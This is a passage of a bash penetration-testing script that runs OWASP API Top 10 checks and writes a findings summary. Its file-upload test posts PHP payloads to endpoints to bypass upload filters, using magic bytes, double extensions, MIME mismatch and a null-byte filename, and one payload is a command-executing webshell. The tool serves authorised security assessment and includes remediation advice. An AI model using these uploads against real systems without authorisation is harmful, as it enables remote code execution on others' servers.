        log_info "T23: No upload endpoints discovered"
        return
    fi

    log_info "T23: Found ${#upload_endpoints[@]} upload endpoint(s)"
    local ev_tag_base="ev-09-${ip//./_}-t23"

    for ep in "${upload_endpoints[@]}"; do
        # Test 1: Magic bytes bypass — GIF89a header + PHP payload
        local resp1
        resp1=$(printf 'GIF89a\n<?php echo "PTORC_PROBE"; ?>' | curl -sk -X POST \
            -F "file=@-;filename=probe.gif;type=image/gif" \
            "${auth_args[@]+"${auth_args[@]}"}" "$ep" 2>/dev/null | head -c 256 || true)
        echo "[T23] Magic bytes (GIF89a+PHP) → ${resp1:0:120}" >> "$evfile"
        if echo "$resp1" | grep -qiE '(success|uploaded|url|path|filename|"id"|location)'; then
            emit_finding "high" \
                "File Upload Bypass — GIF Magic Bytes Accepted with PHP Content (${ip}:${port})" \
                "Endpoint ${ep} accepted a file with GIF89a magic bytes prepended to PHP code (.gif extension). If the server executes uploaded files, this achieves RCE." \
                "Validate content by magic bytes AND extension AND MIME type. Use an allowlist (jpg, png, gif). Rename all uploads to UUID. Store uploads outside web root. Disable PHP execution in the upload directory." \
                "${ev_tag_base}-magic-bytes"
        fi
        _tier_sleep

        # Test 2: Double extension (.php.jpg)
        local resp2
        resp2=$(printf '<?php phpinfo(); ?>' | curl -sk -X POST \
            -F "file=@-;filename=shell.php.jpg;type=image/jpeg" \
            "${auth_args[@]+"${auth_args[@]}"}" "$ep" 2>/dev/null | head -c 256 || true)
        echo "[T23] Double extension (.php.jpg) → ${resp2:0:120}" >> "$evfile"
        if echo "$resp2" | grep -qiE '(success|uploaded|url|path|filename|"id"|location)'; then
            emit_finding "high" \
                "File Upload Bypass — Double Extension Accepted (.php.jpg) (${ip}:${port})" \
                "Endpoint ${ep} accepted a file named 'shell.php.jpg'. Misconfigured Apache/Nginx may execute the .php portion of double-extension filenames." \
                "Validate only the final extension. Deny filenames with multiple dots. Use UUID-based filenames for all uploads. Enforce an extension allowlist." \
                "${ev_tag_base}-double-ext"
        fi
        _tier_sleep

        # Test 3: MIME type mismatch — PHP filename with image/jpeg Content-Type
        local resp3
        resp3=$(printf '<?php system($_GET["cmd"]); ?>' | curl -sk -X POST \
            -F "file=@-;filename=image.php;type=image/jpeg" \
            "${auth_args[@]+"${auth_args[@]}"}" "$ep" 2>/dev/null | head -c 256 || true)
        echo "[T23] MIME mismatch (.php/image/jpeg) → ${resp3:0:120}" >> "$evfile"
        if echo "$resp3" | grep -qiE '(success|uploaded|url|path|filename|"id"|location)'; then
            emit_finding "critical" \
                "File Upload Bypass — PHP File Accepted via MIME Mismatch (${ip}:${port})" \
                "Endpoint ${ep} accepted a .php file with Content-Type: image/jpeg. If stored in a web-accessible directory this is a direct webshell upload (RCE)." \
                "Enforce strict extension allowlist. Never trust client-supplied Content-Type. Rename all uploads. Disable PHP execution in upload directories." \
                "${ev_tag_base}-mime-mismatch"
        fi
        _tier_sleep

        # Test 4: Null byte in filename
        local resp4
        resp4=$(printf '<?php phpinfo(); ?>' | curl -sk -X POST \
            -F "file=@-;filename=shell.php%00.jpg;type=image/jpeg" \
            "${auth_args[@]+"${auth_args[@]}"}" "$ep" 2>/dev/null | head -c 256 || true)
        echo "[T23] Null byte filename (shell.php%00.jpg) → ${resp4:0:120}" >> "$evfile"
        if echo "$resp4" | grep -qiE '(success|uploaded|url|path|filename|"id"|location)'; then
            emit_finding "high" \
                "File Upload — Null Byte Filename Accepted (${ip}:${port})" \
                "Upload endpoint ${ep} accepted a filename containing a URL-encoded null byte (shell.php%00.jpg). Legacy PHP or C-based code may truncate at the null byte, storing the file as shell.php." \
                "Ensure PHP >= 5.3.4 (null byte path fix). Sanitize filenames with basename() and strip null bytes. Validate extension after full filename sanitization." \
                "${ev_tag_base}-null-byte"
        fi
        _tier_sleep
    done

    log_ok "T23: File upload bypass assessment complete (${#upload_endpoints[@]} endpoint(s) probed)"
}

# =============================================================================
# MRK:09_TRUN — PER-TARGET DISPATCHER | trun,target,dispatcher,test | LXXXX-XXXX
# NAV-RULE: no-insert-before; read-toc-first
# =============================================================================

test_target() {
    local host_port="$1"
    local ip; ip=$(echo "$host_port" | cut -d: -f1)
    local port; port=$(echo "$host_port" | cut -d: -f2)
    [[ -z "$port" ]] && port=80

    _CURRENT_IP="$ip"

    local scheme; scheme=$(_scheme "$port")
    local base_url="${scheme}://${ip}:${port}"

    local ip_slug="${ip//./_}"
    local ev_dir="${EVIDENCE_BASE}/${ip_slug}_${port}"
    mkdir -p "$ev_dir"

    log "========================================================"
    log "TARGET: ${base_url} | Profile: ${PROFILE} | Tier: ${TIER}"
    log "========================================================"

    # Reachability check
    local reach_code
    reach_code=$(_curl -o /dev/null -w "%{http_code}" "${base_url}/" || true)
    if [[ "$reach_code" == "000" ]]; then
        log_warn "Target ${base_url} unreachable (curl exit 000) — skipping"
        return
    fi
    log_ok "Target reachable: HTTP ${reach_code}"

    # Initialize summary fields
    _SUMMARY_METHODS="n/a"
    _SUMMARY_SCHEMA=0
    _SUMMARY_AUTH=0
    _SUMMARY_RATE=0
    _SUMMARY_CORS=0
    _SUMMARY_BOLA=0
    _SUMMARY_JWT=0
    _SUMMARY_GQL=0
    _SUMMARY_SSRF=0
    _FIND_AT_START="${_FIND_CTR}"

    # Dispatch tests — pattern: _test_skip N || test_NN_*()
    _test_skip 1  || test_01_http_methods  "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 2  || test_02_schema_discovery "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 3  || test_03_authentication "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 4  || test_04_rate_limiting  "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 5  || test_05_cors           "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 6  || test_06_bola_idor      "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 7  || test_07_mass_assignment "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 8  || test_08_security_headers "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 9  || test_09_jwt_attacks    "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 10 || test_10_graphql        "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 11 || test_11_ssrf           "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 12 || test_12_xxe            "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 13 || test_13_ssti           "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 14 || test_14_smuggling      "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 15 || test_15_host_header    "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 16 || test_16_versioning     "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 17 || test_17_sensitive_data "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 18 || test_18_business_logic "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 19 || test_19_websocket        "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 20 || test_20_tls_transport   "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 21 || test_21_package_manifests "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 22 || test_22_deserialization   "$base_url" "$ev_dir" "$ip" "$port"
    _test_skip 23 || test_23_file_upload_bypass "$base_url" "$ev_dir" "$ip" "$port"

    local target_finds=$(( _FIND_CTR - _FIND_AT_START ))
    log_ok "Target ${base_url} complete — ${target_finds} finding(s)"

    echo "SUMMARY_ROW|${ip}|${port}|${target_finds}|${_SUMMARY_SCHEMA}|${_SUMMARY_AUTH}|${_SUMMARY_RATE}|${_SUMMARY_CORS}|${_SUMMARY_JWT}|${_SUMMARY_GQL}|${_SUMMARY_SSRF}|${_SUMMARY_BOLA}"
}

# =============================================================================
# MRK:09_MAIN — MAIN ENTRY POINT | main,entry,point,summary | L1707-1819
# NAV-RULE: no-insert-before; read-toc-first
# =============================================================================

main() {
    log "PT-Orc 09_app_api_review.sh v2.0 — OWASP API Top 10 + Advanced Attacks"
    log "Session: ${SESSION_TS} | Profile: ${PROFILE} | Tier: ${TIER}"
    [[ "${#CURL_PROXY_ARGS[@]}" -gt 0 ]] && log_info "Intercept proxy: ${CURL_PROXY_ARGS[*]}"

    setup_profile

    local -a targets
    mapfile -t targets < <(assemble_targets)

    confirm_scope "${targets[@]}"

    if command -v trail_phase_start &>/dev/null; then
        trail_phase_start "08_app_api" "App/API Review v2.0" "${#targets[@]} targets"
    fi

    local summary_rows=()

    for host_port in "${targets[@]}"; do
        local row
        row=$(test_target "$host_port")
        while IFS= read -r line; do
            if [[ "$line" == SUMMARY_ROW* ]]; then
                summary_rows+=("$line")
            fi
        done <<< "$row"
    done

    # ── Markdown summary ─────────────────────────────────────────────────────
    local summary_md="${SCRIPT_DIR}/working/$(ev_fname "09-appapi-summary" "md")"
    {
        echo "# App/API Review Summary — ${PROJECT_NAME:-unknown}"
        echo ""
        echo "**Date:** $(date +'%Y-%m-%d %H:%M:%S')"
        echo "**Profile:** ${PROFILE} | **Tier:** ${TIER} | **Tests:** T01-T23"
        echo "**Targets:** ${#targets[@]}"
        [[ "${#CURL_PROXY_ARGS[@]}" -gt 0 ]] && echo "**Proxy:** ${CURL_PROXY_ARGS[*]}"
        echo ""
        echo "## Coverage — OWASP API Top 10 (2023)"
        echo ""
        echo "| # | OWASP | Test | Status |"
        echo "|---|-------|------|--------|"
        echo "| T01 | — | HTTP Method Enumeration | $([ "${_T_ENABLED[1]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T02 | API9 | Schema / API Discovery | $([ "${_T_ENABLED[2]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T03 | API2 | Authentication / JWT none | $([ "${_T_ENABLED[3]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T04 | API4 | Rate Limiting | $([ "${_T_ENABLED[4]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T05 | API8 | CORS Misconfiguration | $([ "${_T_ENABLED[5]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T06 | API1 | BOLA / IDOR | $([ "${_T_ENABLED[6]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T07 | API3 | Mass Assignment / BOPLA | $([ "${_T_ENABLED[7]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T08 | API8 | Security Headers | $([ "${_T_ENABLED[8]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T09 | API2 | JWT Advanced Attacks | $([ "${_T_ENABLED[9]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T10 | — | GraphQL Attacks | $([ "${_T_ENABLED[10]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T11 | API7 | SSRF / IMDS | $([ "${_T_ENABLED[11]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T12 | — | XXE Injection | $([ "${_T_ENABLED[12]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T13 | — | SSTI | $([ "${_T_ENABLED[13]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T14 | — | HTTP Request Smuggling | $([ "${_T_ENABLED[14]:-1}" -eq 1 ] && echo "✓ Run (deep)" || echo "— Skipped") |"
        echo "| T15 | API7 | Host Header Injection | $([ "${_T_ENABLED[15]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T16 | API9 | API Versioning / Shadow APIs | $([ "${_T_ENABLED[16]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T17 | API3 | Sensitive Data Exposure | $([ "${_T_ENABLED[17]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T18 | API5 | Business Logic / BFLA | $([ "${_T_ENABLED[18]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T19 | — | WebSocket Detection | $([ "${_T_ENABLED[19]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T20 | — | TLS / Transport Checks | $([ "${_T_ENABLED[20]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T21 | — | Package Manifest Exposure | $([ "${_T_ENABLED[21]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T22 | — | Deserialization Attack Surface | $([ "${_T_ENABLED[22]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo "| T23 | — | File Upload Bypass | $([ "${_T_ENABLED[23]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
        echo ""
        echo "## Per-Target Results"
        echo ""
        echo "| Host | Port | Findings | Schema | Auth Bypass | No Rate Limit | CORS | JWT | GraphQL | SSRF | BOLA |"
        echo "|------|------|----------|--------|-------------|---------------|------|-----|---------|------|------|"
        for row in "${summary_rows[@]+"${summary_rows[@]}"}"; do
            IFS='|' read -r _ rip rport rfinds rschema rauth rrate rcors rjwt rgql rssrf rbola <<< "$row"
            local fs; fs="$( [[ "${rschema:-0}" -eq 1 ]] && echo "⚠ Exposed" || echo "OK")"
            local fa; fa="$( [[ "${rauth:-0}"   -eq 1 ]] && echo "⚠ Yes"     || echo "OK")"
            local fr; fr="$( [[ "${rrate:-0}"   -eq 1 ]] && echo "⚠ Yes"     || echo "OK")"
            local fc; fc="$( [[ "${rcors:-0}"   -eq 1 ]] && echo "⚠ Yes"     || echo "OK")"
            local fj; fj="$( [[ "${rjwt:-0}"    -eq 1 ]] && echo "⚠ Yes"     || echo "OK")"
            local fg; fg="$( [[ "${rgql:-0}"    -eq 1 ]] && echo "⚠ Yes"     || echo "OK")"
            local fss; fss="$( [[ "${rssrf:-0}" -eq 1 ]] && echo "⚠ Yes"     || echo "OK")"
            local fb; fb="$( [[ "${rbola:-0}"   -eq 1 ]] && echo "⚠ Yes"     || echo "OK")"
            echo "| ${rip} | ${rport} | ${rfinds} | ${fs} | ${fa} | ${fr} | ${fc} | ${fj} | ${fg} | ${fss} | ${fb} |"
        done
        echo ""
        echo "## Total Findings: ${_FIND_CTR}"
        echo ""
        echo "### Findings File"
        echo "\`${FINDINGS_FILE}\`"
        echo ""
        echo "### Evidence Directory"
        echo "\`${EVIDENCE_BASE}\`"
        echo ""
        echo "---"
        echo "*Generated by PT-Orc 09_app_api_review.sh v2.1 — TechGuard Labs*"
        echo "*Profile: ${PROFILE} | OWASP API Top 10 (2023) + JWT/GraphQL/SSRF/XXE/SSTI/Smuggling/Deserial/UploadBypass*"
    } > "$summary_md"

    log_ok "Summary: ${summary_md}"
    log_ok "Findings: ${FINDINGS_FILE} (${_FIND_CTR} total)"
    log_ok "Evidence: ${EVIDENCE_BASE}"

    if command -v trail_phase_end &>/dev/null; then
        trail_phase_end "09_app_api" "${_FIND_CTR} findings" "$summary_md"
    fi

    # Print summary to stdout for pipeline consumption
    cat "$summary_md"
}

main "$@"

# L2 NAV:v1 → ./LOCAL-INDEX.md
# L1 ORC-NAV — read MRK:NAV_TOC first; fetch MRK ranges precisely (no default line count)
